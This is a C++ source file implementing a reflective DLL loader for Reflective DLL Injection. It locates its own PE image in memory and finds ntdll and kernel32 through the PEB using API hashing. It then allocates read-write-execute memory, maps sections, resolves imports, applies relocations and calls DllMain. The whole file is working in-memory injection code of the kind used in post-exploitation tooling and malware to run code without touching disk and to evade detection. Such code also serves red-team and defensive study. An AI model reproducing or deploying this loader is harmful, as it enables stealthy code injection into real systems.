#include "rfl.hpp"

HINSTANCE hAppInstance = nullptr;

using DLLEntry = BOOL(WINAPI *)(HINSTANCE dll, DWORD reason, LPVOID reserved);

// This function is invoked by DLL Loader with Reflective DLL Injection technique.
DLLEXPORT BOOL ReflectiveDllLoader(LPVOID lpParameter)
{   
    // Get image base address
    ULONG_PTR uLibAddr = (ULONG_PTR)ReflectiveCaller();

    ULONG_PTR uHeaderValue;

    while (TRUE)
    {
        if (((PIMAGE_DOS_HEADER)uLibAddr)->e_magic == IMAGE_DOS_SIGNATURE)
        {
            uHeaderValue = ((PIMAGE_DOS_HEADER)uLibAddr)->e_lfanew;

            if (sizeof(IMAGE_DOS_HEADER) <= uHeaderValue && uHeaderValue < 1024)
            {
                uHeaderValue += uLibAddr;
                if (((PIMAGE_NT_HEADERS)uHeaderValue)->Signature == IMAGE_NT_SIGNATURE)
                    break;
            }
        }
        uLibAddr--;
    }

    // Get pointer to PEB
	PPEB pPeb = nullptr;
    #ifdef _WIN64
		pPeb =(PPEB) __readgsqword(0x60);
    #else
		pPeb = (PPEB)__readfsqword(0x30);
    #endif

	// Get modules and functions
	HMODULE hNtdll = (HMODULE)Procs::GetModuleByHash(HASH_NTDLLDLL);
	if (!hNtdll)
	{
		return FALSE;
	}

	HMODULE hKernel32 = (HMODULE)Procs::GetModuleByHash(HASH_KERNEL32DLL);
	if (!hKernel32)
	{
		return FALSE;
	}

	Procs::LPPROC_LOADLIBRARYA lpLoadLibraryA = reinterpret_cast<Procs::LPPROC_LOADLIBRARYA>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_LOADLIBRARYA));
	Procs::LPPROC_GETPROCADDRESS lpGetProcAddress = reinterpret_cast<Procs::LPPROC_GETPROCADDRESS>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_GETPROCADDRESS));
	Procs::LPPROC_VIRTUALALLOC lpVirtualAlloc = reinterpret_cast<Procs::LPPROC_VIRTUALALLOC>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALALLOC));
	Procs::LPPROC_NTFLUSHINSTRUCTIONCACHE lpNtFlushInstructionCache = reinterpret_cast<Procs::LPPROC_NTFLUSHINSTRUCTIONCACHE>(Procs::GetProcAddressByHash(hNtdll, HASH_FUNC_NTFLUSHINSTRUCTIONCACHE));

    // get the VA of the NT Header for the PE to be loaded
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uLibAddr + ((PIMAGE_DOS_HEADER)uLibAddr)->e_lfanew);

	// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
	// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
	ULONG_PTR uBuffer = (ULONG_PTR)lpVirtualAlloc(
        NULL,
        pNtHeaders->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

	// we must now copy over the headers
	ULONG_PTR uLibAddr2 = uLibAddr;
	ULONG_PTR uBuffer2 = uBuffer;

	DWORD dwSizeOfHeaders = pNtHeaders->OptionalHeader.SizeOfHeaders;
	while(dwSizeOfHeaders--)
		*(BYTE*)uBuffer2++ = *(BYTE*)uLibAddr2++;

	ULONG_PTR uSecHeader = (ULONG_PTR)&pNtHeaders->OptionalHeader + pNtHeaders->FileHeader.SizeOfOptionalHeader;
	ULONG_PTR uNumOfSections = pNtHeaders->FileHeader.NumberOfSections;

	while(uNumOfSections--)
	{
		ULONG_PTR uSecVA = (uBuffer + ((PIMAGE_SECTION_HEADER)uSecHeader)->VirtualAddress);
		ULONG_PTR uPtrToRawData = uLibAddr + ((PIMAGE_SECTION_HEADER)uSecHeader)->PointerToRawData;

		// copy the section over
		ULONG_PTR uSizeOfRawData = ((PIMAGE_SECTION_HEADER)uSecHeader)->SizeOfRawData;

		while(uSizeOfRawData--)
			*(BYTE*)uSecVA++ = *(BYTE*)uPtrToRawData++;

		// get the VA of the next section
		uSecHeader += sizeof(IMAGE_SECTION_HEADER);
	}
	
    // uiValueB = the address of the import directory
	PIMAGE_DATA_DIRECTORY pDataDir =  (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	
	ULONG_PTR uImportEntry = uBuffer + pDataDir->VirtualAddress;

    while(((PIMAGE_IMPORT_DESCRIPTOR)uImportEntry)->Name)
    {
        // use LoadLibraryA to load the imported module into memory
		uLibAddr = (ULONG_PTR)lpLoadLibraryA((LPCSTR)(uBuffer + ((PIMAGE_IMPORT_DESCRIPTOR)uImportEntry)->Name));

		ULONG_PTR uOrigFirstThunk = uBuffer + ((PIMAGE_IMPORT_DESCRIPTOR)uImportEntry)->OriginalFirstThunk;
	
		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
		ULONG_PTR uIatVA = uBuffer + ((PIMAGE_IMPORT_DESCRIPTOR)uImportEntry)->FirstThunk;

        // itterate through all imported functions, importing by ordinal if no name present
		while(DEREF(uIatVA))
        {
            // sanity check uiValueD as some compilers only import by FirstThunk
			if(uOrigFirstThunk && ((PIMAGE_THUNK_DATA)uOrigFirstThunk)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uLibAddr + ((PIMAGE_DOS_HEADER)uLibAddr)->e_lfanew);
				PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
				PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(uLibAddr + pDataDir->VirtualAddress);

				ULONG_PTR uFuncAddresses = uLibAddr + pExportDir->AddressOfFunctions;
				// use the import ordinal (- export ordinal base) as an index into the array of addresses
				uFuncAddresses += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uOrigFirstThunk)->u1.Ordinal) - pExportDir->Base) * sizeof(DWORD));

				// patch in the address for this imported function
				DEREF(uIatVA) = (uLibAddr + DEREF_32(uFuncAddresses));
			}
            else
			{
				// get the VA of this functions import by name struct
				PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(uBuffer + DEREF(uIatVA));

				// use GetProcAddress and patch in the address for this imported function
				DEREF(uIatVA) = (ULONG_PTR)lpGetProcAddress((HMODULE)uLibAddr, (LPCSTR)pImportByName->Name);
			}
            // get the next imported function
			uIatVA += sizeof(ULONG_PTR);
			if(uOrigFirstThunk)
				uOrigFirstThunk += sizeof(ULONG_PTR);
        }
        // get the next import
		uImportEntry += sizeof(IMAGE_IMPORT_DESCRIPTOR);
    }

    // calculate the base address delta and perform relocations (even if we load at desired image base)
	uLibAddr = uBuffer - pNtHeaders->OptionalHeader.ImageBase;

	PIMAGE_DATA_DIRECTORY pRelocDataDir = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    // check if their are any relocations present
	if(pRelocDataDir->Size)
    {
		ULONG_PTR uBaseRelocEntry = uBuffer + pRelocDataDir->VirtualAddress;

        // and we itterate through all entries...
		while(((PIMAGE_BASE_RELOCATION)uBaseRelocEntry)->SizeOfBlock)
        {
			ULONG_PTR uRelocVA = (uBuffer + ((PIMAGE_BASE_RELOCATION)uBaseRelocEntry)->VirtualAddress);

			// uiValueD is now the first entry in the current relocation block
			ULONG_PTR uRelocEntry = uBaseRelocEntry + sizeof(IMAGE_BASE_RELOCATION);

			// Number of entries in this relocation block
			DWORD dwNumOfEntries = (((PIMAGE_BASE_RELOCATION)uBaseRelocEntry)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
			while(dwNumOfEntries--)
            {
                if(((PIMAGE_RELOC)uRelocEntry)->type == IMAGE_REL_BASED_DIR64)
                {
					*(ULONG_PTR*)(uRelocVA + ((PIMAGE_RELOC)uRelocEntry)->offset) += uLibAddr;
                }
				else if(((PIMAGE_RELOC)uRelocEntry)->type == IMAGE_REL_BASED_HIGHLOW)
                {
					*(DWORD *)(uRelocVA + ((PIMAGE_RELOC)uRelocEntry)->offset) += (DWORD)uLibAddr;
                }
                else if(((PIMAGE_RELOC)uRelocEntry)->type == IMAGE_REL_BASED_HIGH)
                {
					*(WORD *)(uRelocVA + ((PIMAGE_RELOC)uRelocEntry)->offset) += HIWORD(uLibAddr);
                }
				else if( ((PIMAGE_RELOC)uRelocEntry)->type == IMAGE_REL_BASED_LOW)
                {
					*(WORD *)(uRelocVA + ((PIMAGE_RELOC)uRelocEntry)->offset) += LOWORD(uLibAddr);
                }

				// get the next entry in the current relocation block
				uRelocEntry += sizeof(IMAGE_RELOC);
            }

            // get the next entry in the relocation directory
			uBaseRelocEntry = uBaseRelocEntry + ((PIMAGE_BASE_RELOCATION)uBaseRelocEntry)->SizeOfBlock;
        }
    }

	Procs::LPPROC_DLLMAIN lpDllMain = reinterpret_cast<Procs::LPPROC_DLLMAIN>(uBuffer + pNtHeaders->OptionalHeader.AddressOfEntryPoint);

	lpNtFlushInstructionCache((HANDLE)-1, NULL, 0);

    lpDllMain((HINSTANCE)uBuffer, DLL_PROCESS_ATTACH, NULL);

    return TRUE;
}